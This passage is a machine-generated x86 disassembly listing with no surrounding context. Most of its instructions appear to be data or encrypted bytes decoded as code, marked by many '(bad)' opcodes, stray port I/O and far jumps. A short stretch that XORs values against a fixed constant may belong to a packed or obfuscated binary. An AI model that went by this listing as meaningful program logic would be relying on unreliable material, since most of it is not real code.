  41a7c1:	sub    ecx,DWORD PTR [esi+0x57dee96b]
  41a7c7:	inc    ecx
  41a7c8:	xchg   esp,eax
  41a7c9:	lahf   
  41a7ca:	mov    esi,0x902c4a73
  41a7cf:	je     0x41a7bd
  41a7d1:	sub    bl,0x64
  41a7d4:	lahf   
  41a7d5:	jns    0x41a82b
  41a7d7:	pusha  
  41a7d8:	sub    eax,0xceaa7eaf
  41a7dd:	nop    DWORD PTR [ebp+0x5b4f2565]
  41a7e4:	mov    dh,0xf5
  41a7e6:	xchg   esi,eax
  41a7e7:	xlat   BYTE PTR ds:[ebx]
  41a7e8:	inc    ebp
  41a7e9:	loopne 0x41a78f
  41a7eb:	imul   eax,edi,0x1cc67cc0
  41a7f1:	out    0xd8,al
  41a7f3:	push   edx
  41a7f4:	outs   dx,DWORD PTR ds:[esi]
  41a7f5:	mov    dl,0x3
  41a7f7:	lods   al,BYTE PTR ds:[esi]
  41a7f8:	jae    0x41a796
  41a7fa:	push   eax
  41a7fb:	test   DWORD PTR [ebx+ecx*1],ecx
  41a7fe:	add    DWORD PTR [ecx-0x3923cefa],ebp
  41a804:	pop    ecx
  41a805:	mov    ds:0x33202e29,eax
  41a80a:	mov    BYTE PTR [ebx+0x42d1f649],0xde
  41a811:	ror    ecx,0xdf
  41a814:	cdq    
  41a815:	in     eax,dx
  41a816:	je     0x41a81c
  41a818:	loop   0x41a826
  41a81a:	into   
  41a81b:	xchg   esp,eax
  41a81c:	xchg   ebx,eax
  41a81d:	jmp    0x38c814f
  41a822:	lods   al,BYTE PTR ds:[esi]
  41a823:	imul   DWORD PTR [ecx+0x6b]
  41a826:	dec    esp
  41a827:	cwde   
  41a828:	add    ebp,DWORD PTR ds:0xd90dca14
  41a82e:	sbb    eax,0xa5517cda
  41a833:	and    BYTE PTR [eax+0x25d00942],bl
  41a839:	push   esi
  41a83a:	pop    eax
  41a83b:	sbb    ebp,edx
  41a83d:	push   edx
  41a83e:	fsub   DWORD PTR [ebx-0x1740f304]
  41a844:	imul   ebp,DWORD PTR [esi],0x57
  41a847:	or     dh,BYTE PTR ds:0x3232d536
  41a84d:	fist   DWORD PTR [edx+0x39]
  41a850:	and    al,0x5b
  41a852:	push   edi
  41a853:	or     eax,0xcdb88f6f
  41a858:	pop    ecx
  41a859:	pop    es
  41a85a:	test   eax,ebp
  41a85c:	cmp    al,0xe2
  41a85e:	jecxz  0x41a854
  41a860:	loope  0x41a8a4
  41a862:	repnz xor edx,ecx
  41a865:	out    dx,al
  41a866:	xchg   BYTE PTR gs:[edi+0x3ffb76cd],dl
  41a86d:	in     al,0xc9
  41a86f:	sbb    al,bh
  41a871:	dec    esi
  41a872:	dec    edi
  41a873:	aam    0xea
  41a875:	mov    fs,WORD PTR [edx+eiz*1-0x12]
  41a879:	push   es
  41a87a:	push   edx
  41a87b:	sub    DWORD PTR [edi-0x12],ebp
  41a87e:	mov    esi,0x47f9e504
  41a883:	mov    al,0xd3
  41a885:	mov    al,ss:0x8b83f2e9
  41a88b:	repz bound ecx,QWORD PTR [ecx-0x48]
  41a88f:	je     0x41a83a
  41a891:	retf   
  41a892:	es mov al,0x7
  41a896:	pop    edx
  41a897:	test   eax,0x32853767
  41a89c:	fs dec edx
  41a89e:	mov    al,ds:0xacf18899
  41a8a3:	test   BYTE PTR [edi+ebx*4-0x6d],bl
  41a8a7:	cld    
  41a8a8:	(bad)  
  41a8a9:	jg     0x41a8fb
  41a8ab:	ins    DWORD PTR es:[edi],dx
  41a8ac:	jp     0x41a883
  41a8ae:	xor    al,0xb0
  41a8b0:	popa   
  41a8b1:	mov    esi,0x44e9c303
  41a8b6:	and    BYTE PTR [eax],al
  41a8b8:	add    BYTE PTR [ebx-0x48f02bbb],cl
  41a8be:	add    al,0x78
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	xor    DWORD PTR [edi+0x48b856f0],0xffffffd5
  41a91b:	jg     0x41a995
  41a91d:	adc    BYTE PTR [esi+0x78],bh
  41a920:	js     0x41a999
  41a922:	lds    edx,FWORD PTR [edx+0x1]
  41a925:	pushf  
  41a926:	pop    ds
  41a927:	call   0xf5fa938f
  41a92c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a92d:	lds    eax,FWORD PTR [edi+0xb1e42eb]
  41a933:	out    0x19,al
  41a935:	xor    ch,BYTE PTR [ebx]
  41a937:	out    0x8,al
  41a939:	pop    ecx
  41a93a:	pop    ss
  41a93b:	dec    eax
  41a93c:	xchg   esp,eax
  41a93d:	xchg   ebp,eax
  41a93e:	inc    ecx
  41a93f:	or     BYTE PTR ds:0xaf5c9f11,al
  41a945:	imul   ebp,DWORD PTR ds:0xc0e574c1,0x87b54e60
  41a94f:	sbb    ch,ch
  41a951:	cdq    
  41a952:	ins    DWORD PTR es:[edi],dx
  41a953:	retf   0x1188
  41a956:	repnz add eax,0xf51f5207
  41a95c:	xchg   edx,eax
  41a95d:	xchg   DWORD PTR [ebp+eiz*2-0x12],eax
  41a961:	and    al,0x63
  41a963:	repnz sub BYTE PTR [edx],cl
  41a966:	jns    0x41a92b
  41a968:	imul   edx,DWORD PTR [edx],0xffffffec
  41a96b:	sbb    eax,0xa1b55fda
  41a970:	jmp    0x41a984
  41a972:	mov    DWORD PTR [ecx-0x4a],0x58340bad
  41a979:	mov    ebp,0xe34c74e4
  41a97e:	jle    0x41a94b
  41a980:	stos   BYTE PTR es:[edi],al
  41a981:	fs dec esi
  41a983:	popa   
  41a984:	cmp    bh,BYTE PTR [edi-0x6d]
  41a987:	(bad)  
  41a988:	cmp    ch,bh
  41a98a:	retf   
  41a98b:	popa   
  41a98c:	push   edx
  41a98d:	test   DWORD PTR [eax+edx*8+0x66],0xadd55837
  41a995:	loopne 0x41a967
  41a997:	imul   ebp,DWORD PTR [esi+eiz*2-0x36],0xc594fe39
  41a99f:	mov    ch,0x6f
  41a9a1:	add    BYTE PTR [ecx+0x33],bl
  41a9a4:	enter  0xf7e,0x81
  41a9a8:	push   cs
  41a9a9:	push   0x31ce5649
  41a9ae:	push   ds
  41a9af:	nop
  41a9b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9b1:	std    
  41a9b2:	std    
  41a9b3:	sahf   
  41a9b4:	xchg   BYTE PTR [ebp-0x39756f56],bh
  41a9ba:	xchg   esi,eax
  41a9bb:	pop    ebx
  41a9bc:	mov    eax,0x706689c3
  41a9c1:	push   edi
  41a9c2:	jbe    0x41a9b0
  41a9c4:	push   esi
  41a9c5:	fisub  DWORD PTR ds:0x8784e61b
  41a9cb:	enter  0xd221,0x6b
  41a9cf:	mov    WORD PTR [edx-0x26447cc0],?
  41a9d5:	test   al,0xa7
  41a9d7:	mov    edi,0xef7aea03
  41a9dc:	mov    ah,0x70
  41a9de:	add    esi,DWORD PTR [ebx+0x2c2c4ed2]
  41a9e4:	or     edx,DWORD PTR [edx-0x20]
  41a9e7:	cmp    al,0xf0
  41a9e9:	inc    esi
  41a9ea:	sub    ebp,esi
  41a9ec:	and    DWORD PTR [edx-0x72ea6f55],edi
  41a9f2:	mov    al,0x95
  41a9f4:	xchg   edx,eax
  41a9f5:	fistp  WORD PTR [eax-0x5cb36f45]
  41a9fb:	daa    
  41a9fc:	jp     0x41a9c1
  41a9fe:	sub    cl,BYTE PTR [edi+0x15]
  41aa01:	adc    esi,DWORD PTR [edi-0x26010395]
  41aa07:	bnd jmp 0x41aa6b
  41aa0a:	dec    edx
  41aa0b:	(bad)  
  41aa0c:	dec    edi
  41aa0d:	jecxz  0x41aa33
  41aa0f:	int3   
  41aa10:	add    eax,0x17da7ece
  41aa15:	adc    DWORD PTR [edi],ebx
  41aa17:	ret    0xc43d
  41aa1a:	and    DWORD PTR [edx-0x7],ecx
  41aa1d:	mov    ah,0x3a
  41aa1f:	xor    cl,BYTE PTR [ecx+0x658f1e44]
  41aa25:	aam    0x3f
  41aa27:	mov    edi,0x78988c70
  41aa2c:	pop    edi
  41aa2d:	add    eax,DWORD PTR [edx]
  41aa2f:	out    dx,eax
  41aa30:	xchg   DWORD PTR [esp+ecx*4],ecx
  41aa33:	je     0x41aa59
  41aa35:	ins    BYTE PTR es:[edi],dx
  41aa36:	mov    eax,ds:0xa39f3ba
  41aa3b:	jno    0x41a9ee
  41aa3d:	adc    BYTE PTR [esp+edi*8-0x67e04a3a],al
  41aa44:	(bad)  
  41aa45:	sahf   
  41aa46:	dec    edx
  41aa47:	(bad)  
  41aa48:	ret    
  41aa49:	aad    0xf1
  41aa4b:	mov    WORD PTR [edi],es
  41aa4d:	das    
  41aa4e:	in     al,dx
  41aa4f:	push   esp
  41aa50:	fiadd  WORD PTR [edx+0x4c51a940]
  41aa56:	push   esi
  41aa57:	dec    ecx
  41aa58:	out    0xcc,eax
  41aa5a:	pop    ebx
  41aa5b:	jmp    0x41aaa5
  41aa5d:	xchg   BYTE PTR [edi],dl
  41aa5f:	test   DWORD PTR [edx-0x312835e0],eax
  41aa65:	mov    edx,DWORD PTR [ecx-0x7c]
  41aa68:	ins    DWORD PTR es:[edi],dx
  41aa69:	cwde   
  41aa6a:	dec    ecx
  41aa6b:	scas   eax,DWORD PTR es:[edi]
  41aa6c:	shl    BYTE PTR [ebp+0x53],cl
  41aa6f:	sbb    ebp,esp
  41aa71:	popf   
  41aa72:	mov    al,0x93
  41aa74:	add    ebx,edx
  41aa76:	retf   
  41aa77:	adc    dh,BYTE PTR [edi-0x6d5a332e]
  41aa7d:	int    0x1c
  41aa7f:	push   0x52992e63
  41aa84:	push   eax
  41aa85:	xor    ah,ch
  41aa87:	out    dx,eax
  41aa88:	scas   al,BYTE PTR es:[edi]
  41aa89:	mov    edi,0x30dfd3a2
  41aa8e:	fld    DWORD PTR [ecx-0x215af188]
  41aa94:	aas    
  41aa95:	inc    ebx
  41aa96:	and    ecx,DWORD PTR [ebx+0x684b15ac]
  41aa9c:	shl    ebx,1
  41aa9e:	cmp    DWORD PTR [esi+0x4e61194b],ebx
  41aaa4:	xchg   DWORD PTR [esi-0x63],esi
  41aaa7:	dec    ebp
  41aaa8:	pop    ebx
  41aaa9:	enter  0x77b6,0x74
  41aaad:	and    eax,0xf607be5a
  41aab2:	shl    DWORD PTR [edi-0x443652df],0xc5
  41aab9:	inc    edx
  41aaba:	cmc    
  41aabb:	jno    0x41ab07
  41aabd:	xchg   ecx,eax
  41aabe:	pop    edx
  41aabf:	fldcw  WORD PTR [edi-0x67641da8]
  41aac5:	fist   DWORD PTR [edi-0x6509ffcf]
  41aacb:	and    al,0xa0
  41aacd:	mov    edx,0x4f44db12
  41aad2:	retf   
  41aad3:	rcl    DWORD PTR [ecx-0x46],cl
  41aad6:	push   esi
  41aad7:	push   cs
  41aad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aad9:	sub    eax,0x20bfc022
  41aade:	cmp    ebp,DWORD PTR [ecx+0x30]
  41aae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aae2:	mov    eax,0x41beff18
  41aae7:	inc    edx
  41aae8:	rcr    BYTE PTR [esi+0x6dc64d61],1
  41aaee:	jo     0x41aa9b
  41aaf0:	lods   al,BYTE PTR ds:[esi]
  41aaf1:	pop    ecx
  41aaf2:	scas   eax,DWORD PTR es:[edi]
  41aaf3:	imul   ecx,DWORD PTR [eax],0xcdcb3ed6
  41aaf9:	push   ebx
  41aafa:	add    ebp,DWORD PTR [ebp+0x35]
  41aafd:	xor    BYTE PTR [edx-0x48],al
  41ab00:	fsub   QWORD PTR [ecx+ecx*2]
  41ab03:	dec    eax
  41ab04:	ja     0x41aabe
  41ab06:	sbb    al,0xdc
  41ab08:	dec    ebx
  41ab09:	xor    dh,BYTE PTR fs:[esi-0x7e]
  41ab0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab0e:	rcl    ebx,cl
  41ab10:	sti    
  41ab11:	shld   DWORD PTR [ebp-0x2438d828],ecx,cl
  41ab18:	cli    
  41ab19:	mov    eax,ds:0x40d00781
  41ab1e:	mov    bh,dh
  41ab20:	or     DWORD PTR [ebx+0x59],eax
  41ab23:	and    eax,0xa392e736
  41ab28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab29:	outs   dx,DWORD PTR ds:[esi]
  41ab2a:	dec    esi
  41ab2b:	je     0x41aad5
  41ab2d:	push   es
  41ab2e:	inc    ecx
  41ab2f:	loope  0x41ab48
  41ab31:	xor    eax,0xf5eea31c
  41ab36:	and    BYTE PTR ss:[eax],al
  41ab39:	pop    ecx
  41ab3a:	push   0x5
  41ab3c:	dec    ecx
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0xcbd2d2be
  41ab52:	and    BYTE PTR [eax-0x25],0x7f
  41ab56:	js     0x41ab68
  41ab58:	jle    0x41abd2
  41ab5a:	js     0x41ab71
  41ab5c:	adc    al,bh
  41ab5e:	fwait
  41ab5f:	mov    bh,0xd6
  41ab61:	aad    0x64
  41ab63:	scas   eax,DWORD PTR es:[edi]
  41ab64:	sub    bh,dl
  41ab66:	ins    DWORD PTR es:[edi],dx
  41ab67:	leave  
  41ab68:	inc    edx
  41ab69:	scas   eax,DWORD PTR es:[edi]
  41ab6a:	in     al,dx
  41ab6b:	or     ebp,edx
  41ab6d:	pop    edx
  41ab6e:	or     BYTE PTR [eax-0x1],cl
  41ab71:	mov    eax,ds:0x59f6453f
  41ab76:	stos   BYTE PTR es:[edi],al
  41ab77:	xchg   ebx,eax
  41ab78:	or     al,0xb6
  41ab7a:	pop    ss
  41ab7b:	or     eax,0xe69ca2e3
  41ab80:	loop   0x41ab51
  41ab82:	inc    esp
  41ab83:	mov    esi,0xbfa212f3
  41ab88:	stos   DWORD PTR es:[edi],eax
  41ab89:	test   dh,0xd5
  41ab8c:	push   ecx
  41ab8d:	daa    
  41ab8e:	push   0x7ba33569
  41ab93:	pop    ebp
  41ab94:	lds    esi,FWORD PTR [ebx]
  41ab96:	sahf   
  41ab97:	scas   al,BYTE PTR es:[edi]
  41ab98:	retf   
  41ab99:	or     al,0xd8
  41ab9b:	xchg   ebx,eax
  41ab9c:	xor    BYTE PTR ds:0xa803a97b,dl
  41aba2:	xchg   ebp,eax
  41aba3:	test   ch,bh
  41aba5:	aaa    
  41aba6:	ja     0x41ab87
  41aba8:	cdq    
  41aba9:	fild   WORD PTR [eax+0x21]
  41abac:	shr    DWORD PTR [edi],0x41
  41abaf:	mov    WORD PTR [esi-0x59afdfeb],fs
  41abb5:	sbb    eax,0xd1692c41
  41abba:	jno    0x41ab86
  41abbc:	cmp    eax,0xc5057254
  41abc1:	xchg   BYTE PTR [edi+0x5535b2e3],bh
  41abc7:	inc    edi
  41abc8:	popf   
  41abc9:	shr    DWORD PTR [eax+ecx*2],1
  41abcc:	add    DWORD PTR [ebx-0x25],esi
  41abcf:	dec    BYTE PTR [esi+0x5166950]
  41abd5:	in     eax,0x65
  41abd7:	jmp    0x41abb9
  41abd9:	popa   
  41abda:	mov    cl,BYTE PTR [esi+0x43]
  41abdd:	mul    ch
  41abdf:	mov    al,0xae
  41abe1:	cmp    eax,0x8dcd351d
  41abe6:	xor    esp,DWORD PTR [eax]
  41abe8:	adc    al,bh
  41abea:	loop   0x41abeb
  41abec:	pop    ecx
  41abed:	stc    
  41abee:	loop   0x41ab84
  41abf0:	stc    
  41abf1:	add    esi,DWORD PTR [ecx]
  41abf3:	pop    eax
  41abf4:	es mov bh,0x1
  41abf7:	or     bl,BYTE PTR [esi+0x67]
  41abfa:	inc    eax
  41abfb:	sbb    al,0xd1
  41abfd:	adc    BYTE PTR [edi-0x61],ah
  41ac00:	lahf   
  41ac01:	dec    edi
  41ac02:	(bad)  
  41ac03:	sbb    bl,BYTE PTR [ebp+0x36]
  41ac06:	test   eax,0xe629e15d
  41ac0b:	jmp    FWORD PTR [eax+0x2f6e1b5c]
  41ac11:	cdq    
  41ac12:	in     eax,dx
  41ac13:	repnz xchg esi,eax
  41ac15:	out    dx,al
  41ac16:	aas    
  41ac17:	jecxz  0x41ac03
  41ac19:	jbe    0x41ac33
  41ac1b:	jno    0x41ac65
  41ac1d:	fnstenv [ecx-0x3b]
  41ac20:	cwde   
  41ac21:	jo     0x41ac57
  41ac23:	sub    BYTE PTR [edx+0xfc503d0],cl
  41ac29:	or     BYTE PTR [edi+0x64],0xfb
  41ac2d:	jmp    0xfb8846c1
  41ac32:	out    0x7d,al
  41ac34:	pushf  
  41ac35:	(bad)  
  41ac36:	in     al,dx
  41ac37:	(bad)  
  41ac38:	xchg   BYTE PTR [ecx-0x79],ch
  41ac3b:	push   ebx
  41ac3c:	xor    eax,0x7b727960
  41ac41:	sbb    DWORD PTR [ecx-0x17],esp
  41ac44:	std    
  41ac45:	clc    
  41ac46:	retf   0x905e
  41ac49:	dec    esi
  41ac4a:	aas    
  41ac4b:	xor    eax,0x230f2477
  41ac50:	sbb    dh,0x1b
  41ac53:	xchg   edi,eax
  41ac54:	stc    
  41ac55:	iret   
  41ac56:	jns    0x41ac80
  41ac58:	sub    ebp,DWORD PTR [edi-0x5f]
  41ac5b:	das    
  41ac5c:	jle    0x41ac84
  41ac5e:	add    bh,BYTE PTR [ecx]
  41ac60:	inc    esi
  41ac61:	mov    cl,0xe4
  41ac63:	sbb    DWORD PTR [ebp-0x75],esp
  41ac66:	fsub   QWORD PTR [edx-0x3c]
  41ac69:	mov    ch,0x21
  41ac6b:	pop    es
  41ac6c:	rcl    DWORD PTR [ecx+eax*2+0x4f],cl
  41ac70:	inc    si
  41ac72:	mov    dl,0x63
  41ac74:	add    esi,eax
  41ac76:	dec    edi
  41ac77:	pop    edx
  41ac78:	pop    eax
  41ac79:	in     eax,0x0
  41ac7b:	pop    edi
  41ac7c:	mov    dh,0xcd
  41ac7e:	je     0x41aca4
  41ac80:	jo     0x41acb5
  41ac82:	loopne 0x41ac09
  41ac84:	repz mov eax,0x37f0d9d1
  41ac8a:	sub    ebp,ebp
  41ac8c:	jnp    0x41acb9
  41ac8e:	or     cl,BYTE PTR [edi]
  41ac90:	jle    0x41ac5c
  41ac92:	lods   eax,DWORD PTR ds:[esi]
  41ac93:	jle    0x41ac67
  41ac95:	mov    ebp,0x2492dfb
  41ac9a:	bound  ebp,QWORD PTR [ebx+0x4f]
  41ac9d:	dec    esi
  41ac9e:	imul   ebx,DWORD PTR [edi-0x1d],0x3a
  41aca2:	fs call 0x7b52:0xd1740c4c
  41acaa:	sub    eax,ebx
  41acac:	dec    edx
  41acad:	jnp    0x41aca9
  41acaf:	mov    ebx,0x80f74325
  41acb4:	push   edi
  41acb5:	xor    DWORD PTR [ecx],ebx
  41acb7:	sub    ebx,DWORD PTR fs:[eax+0x2]
  41acbb:	ror    BYTE PTR [ecx-0x7a],1
  41acbe:	and    ch,bh
  41acc0:	rol    BYTE PTR [ebx+0x352738b6],0x72
  41acc7:	rol    DWORD PTR [ebp+0x27036a5a],cl
  41accd:	ins    BYTE PTR es:[edi],dx
  41acce:	and    eax,0x902830c2
  41acd3:	push   esp
  41acd4:	cld    
  41acd5:	imul   ebp,DWORD PTR [ecx-0x42],0x950089ec
  41acdc:	div    DWORD PTR [esi-0x770df67e]
  41ace2:	jl     0x41ac76
  41ace4:	inc    ebp
  41ace5:	xor    DWORD PTR [ebx-0x53c94109],eax
  41aceb:	das    
  41acec:	pop    ss
  41aced:	jl     0x41acb0
  41acef:	xchg   ebp,eax
  41acf0:	inc    ebp
  41acf1:	sub    DWORD PTR [eax+0xb72ee53],edx
  41acf7:	jmp    0xbdd43ccb
  41acfc:	stos   BYTE PTR es:[edi],al
  41acfd:	xor    bh,BYTE PTR [esi-0x51]
  41ad00:	push   0x70
  41ad02:	push   0xffffff8b
  41ad04:	fidivr DWORD PTR [ebx-0x10305963]
  41ad0a:	addr16 nop
  41ad0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad0d:	sbb    DWORD PTR [ecx+0x42],esp
  41ad10:	ror    BYTE PTR [edx],0x2a
  41ad13:	pop    edi
  41ad14:	xor    eax,0x51c442b3
  41ad19:	(bad)  
  41ad1a:	cli    
  41ad1b:	dec    ebx
  41ad1c:	sub    DWORD PTR [ebp+ebx*4+0x39a2dca9],edx
  41ad23:	lods   al,BYTE PTR ds:[esi]
  41ad24:	int    0xac
  41ad26:	int    0x42
  41ad28:	lods   eax,DWORD PTR ds:[esi]
  41ad29:	dec    edi
  41ad2a:	dec    ebp
  41ad2b:	jae    0x41acf7
  41ad2d:	jmp    0x41ad85
  41ad2f:	ins    BYTE PTR es:[edi],dx
  41ad30:	mov    ebp,0x64228d9d
  41ad35:	aaa    
  41ad36:	(bad)
  41ad39:	xchg   ebp,eax
  41ad3a:	int3   
  41ad3b:	add    eax,0x7d1a6014
  41ad40:	out    0xb1,eax
  41ad42:	test   BYTE PTR [ebx-0x66],ah
  41ad45:	cmovae ebp,DWORD PTR [esi]
  41ad48:	fstp   DWORD PTR [edx-0x50]
  41ad4b:	sub    BYTE PTR [ebx-0x5e],dl
  41ad4e:	fisub  DWORD PTR [edi-0x75]
  41ad51:	aas    
  41ad52:	sbb    DWORD PTR [esi+eiz*8+0x7f555756],esp
  41ad59:	popa   
  41ad5a:	pop    es
  41ad5b:	jae    0x41ada9
  41ad5d:	(bad)  
  41ad5e:	jle    0x41ad97
  41ad60:	rcl    DWORD PTR [ebx],cl
  41ad62:	mov    ah,0x24
  41ad64:	cld    
  41ad65:	pop    esp
  41ad66:	cmp    ecx,0xffffff80
  41ad69:	pop    es
  41ad6a:	ffreep st(3)
  41ad6c:	shr    BYTE PTR [ebx+ebp*4-0x51dece2c],1
  41ad73:	xchg   ebx,ecx
  41ad75:	sub    ebx,ecx
  41ad77:	jmp    0x41afac
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0x1bd25295,eax
  41ad89:	shr    DWORD PTR [esi],1
  41ad8b:	or     DWORD PTR [eax-0x28],edi
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41ad85
  41ad95:	jl     0x41ad3f
  41ad97:	ret    
  41ad98:	and    BYTE PTR [edi-0x8],ch
  41ad9b:	jecxz  0x41adf0
  41ad9d:	adc    al,0x8f
  41ad9f:	inc    edi
  41ada0:	cdq    
  41ada1:	iret   
  41ada2:	or     eax,0x8db01bf0
  41ada7:	jp     0x41ade0
  41ada9:	and    ch,BYTE PTR [edi+0x637dc0af]
  41adaf:	jp     0x41ae27
  41adb1:	hlt    
  41adb2:	mov    ebx,0x1e2d6a6f
  41adb7:	xchg   BYTE PTR [ecx-0x7d],cl
  41adba:	jo     0x41ad71
  41adbc:	dec    edx
  41adbd:	test   ebx,edx
  41adbf:	add    bl,al
  41adc1:	call   0x784e71b8
  41adc6:	jp     0x41ad85
  41adc8:	jp     0x41adab
  41adca:	aad    0xff
  41adcc:	dec    edx
  41adcd:	push   es
  41adce:	test   BYTE PTR [ebp-0x52ef12b6],ch
  41add4:	pusha  
  41add5:	push   ss
  41add6:	jmp    0x831e:0x6a6fc85
  41addd:	aas    
  41adde:	or     ecx,DWORD PTR [ebp-0x4f01f271]
  41ade4:	and    al,0x3e
  41ade6:	jae    0x41ae51
  41ade8:	loope  0x41adbf
  41adea:	(bad)
  41aded:	aaa    
  41adee:	dec    ebx
  41adef:	cmp    eax,0xfe195a52
  41adf4:	push   ebx
  41adf5:	cmp    eax,0x70fe8f85
  41adfa:	lods   eax,DWORD PTR ds:[esi]
  41adfb:	adc    DWORD PTR [edi],ebx
  41adfd:	das    
  41adfe:	pop    edi
  41adff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae00:	jns    0x41ad8a
  41ae02:	mov    edx,0x1249b4d5
  41ae07:	cmp    BYTE PTR [ebx+0x42e400aa],cl
  41ae0d:	loopne 0x41ae21
  41ae0f:	push   edx
  41ae10:	and    ebp,eax
  41ae12:	push   eax
  41ae13:	sub    eax,0x739e7e28
  41ae18:	push   ds
  41ae19:	add    ebp,edi
  41ae1b:	jmp    0x935db499
  41ae20:	push   esi
  41ae21:	pop    edx
  41ae22:	pop    es
  41ae23:	(bad)  
  41ae24:	je     0x41ae34
  41ae26:	(bad)  
  41ae27:	shl    esi,1
  41ae29:	ja     0x41adea
  41ae2b:	std    
  41ae2c:	fwait
  41ae2d:	loopne 0x41ae56
  41ae2f:	sbb    eax,0x505651ad
  41ae34:	aas    
  41ae35:	push   ebp
  41ae36:	or     DWORD PTR [ebp+0x9d0e786],0xf8ba86ec
  41ae40:	scas   eax,DWORD PTR es:[edi]
  41ae41:	dec    esp
  41ae42:	jbe    0x41ae8c
  41ae44:	cmp    al,0xa
  41ae46:	jmp    0x3433:0xba7fe3f9
  41ae4d:	aam    0x4
  41ae4f:	mov    ch,0x30
  41ae51:	xchg   edx,eax
  41ae52:	xchg   ecx,eax
  41ae53:	outs   dx,DWORD PTR ds:[esi]
  41ae54:	scas   eax,DWORD PTR es:[edi]
  41ae55:	pop    ebx
  41ae56:	(bad)  
  41ae57:	push   esp
  41ae58:	push   edx
  41ae59:	push   cs
  41ae5a:	inc    ebx
  41ae5b:	jne    0x41aeb0
  41ae5d:	cdq    
  41ae5e:	(bad)  
  41ae5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae60:	xchg   ebp,eax
  41ae61:	arpl   WORD PTR [edi+0x4455a51],bx
  41ae67:	inc    edx
  41ae68:	and    eax,0x13c9c577
  41ae6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae6e:	aad    0x15
  41ae70:	xchg   ebp,eax
  41ae71:	shr    BYTE PTR ds:0x21985a14,0x60
  41ae78:	out    0x45,al
  41ae7a:	mov    bh,0x2b
  41ae7c:	arpl   WORD PTR [ecx-0x70],bp
  41ae7f:	jne    0x41ae78
  41ae81:	mov    edi,0xd5b2d3bc
  41ae86:	jmp    0xd82f:0xa67d766c
  41ae8d:	ret    
  41ae8e:	inc    esp
  41ae8f:	fwait
  41ae90:	xchg   ecx,eax
  41ae91:	mov    edi,0x165529fe
  41ae96:	xchg   ecx,eax
  41ae97:	and    DWORD PTR [edx+0x77b31f5],eax
  41ae9d:	push   ss
  41ae9e:	adc    DWORD PTR [eax+0x6e1ff859],0x56
  41aea5:	ins    DWORD PTR es:[edi],dx
  41aea6:	mov    dl,0x6d
  41aea8:	aad    0x2e
  41aeaa:	repnz fs mov bh,0x35
  41aeae:	jns    0x41af23
  41aeb0:	cmp    eax,0xb6e4e172
  41aeb5:	mov    DWORD PTR [esi-0x4f],esp
  41aeb8:	test   al,0x4f
  41aeba:	sbb    eax,0xc907ef5a
  41aebf:	mov    WORD PTR [eax-0x45],es
  41aec2:	(bad)  [edi-0x75]
  41aec5:	lds    ebp,FWORD PTR [edi-0x18]
  41aec8:	mov    cl,0xb0
  41aeca:	push   ebp
  41aecb:	inc    edi
  41aecc:	out    0xa5,eax
  41aece:	and    cl,BYTE PTR [ebx]
  41aed0:	inc    ebp
  41aed1:	sbb    ebp,DWORD PTR [edi+0x7]
  41aed4:	imul   ebx,DWORD PTR [ebx],0x8ed91393
  41aeda:	rol    dl,0x29
  41aedd:	mov    ah,0x46
  41aedf:	xor    eax,0xc1f0c3ff
  41aee4:	icebp  
  41aee5:	inc    edi
  41aee6:	pop    esp
  41aee7:	pop    eax
  41aee8:	ins    BYTE PTR es:[edi],dx
  41aee9:	ret    0x12e7
  41aeec:	xchg   ebp,eax
  41aeed:	dec    edi
  41aeee:	push   cs
  41aeef:	and    BYTE PTR [ecx],dl
  41aef1:	pop    ss
  41aef2:	dec    eax
  41aef3:	pop    edx
  41aef4:	add    BYTE PTR [eax],0x99
  41aef7:	pop    edi
  41aef8:	mov    eax,ds:0x7cde6708
  41aefd:	lea    esi,[eax+0x11]
  41af00:	or     eax,0x3ff45b51
  41af05:	mov    al,ds:0x26daf58b
  41af0a:	stos   DWORD PTR es:[edi],eax
  41af0b:	lahf   
  41af0c:	scas   eax,DWORD PTR es:[edi]
  41af0d:	xor    BYTE PTR [ebp-0x6873829],ch
  41af13:	mov    al,BYTE PTR [esi]
  41af15:	push   eax
  41af16:	mov    dl,0xfc
  41af18:	aas    
  41af19:	repz mov al,0x3a
  41af1c:	sub    esi,DWORD PTR [esi+0x5e45d28e]
